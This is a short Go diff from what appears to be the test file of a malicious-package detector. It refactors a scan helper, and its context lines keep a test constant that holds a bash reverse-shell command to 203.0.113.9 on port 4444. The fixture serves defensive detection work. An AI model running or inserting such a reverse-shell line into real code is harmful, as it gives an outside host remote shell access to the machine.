@@ -13,7 +13,7 @@ func classOfID(fs []Finding, id string) Class {
 }
 
 func libScan(eco, content string) []Finding {
-	return Detect(&PackageContext{Name: "pkg", Ecosystem: eco, PkgbuildContent: content})
+	return Detect(ctxFixture(eco, content))
 }
 
 const revshell = "\tcmd := exec.Command(\"bash\", \"-c\", \"bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\")\n"
